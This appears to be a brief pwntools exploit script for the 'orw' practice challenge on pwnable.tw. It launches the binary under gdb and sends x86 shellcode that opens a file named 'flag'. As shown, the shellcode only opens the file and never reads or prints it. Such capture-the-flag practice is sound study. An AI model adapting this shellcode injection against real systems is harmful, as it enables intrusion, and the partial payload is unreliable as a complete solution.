#! /usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
shellcode = "j\x05Xhflag1\xc9\x99T[\xcd\x80"
#p = remote("chall.pwnable.tw", 10000)
p = process("./orw")
gdb.attach(p, 'b _start')
p.recv()
p.send(shellcode)
p.interactive()
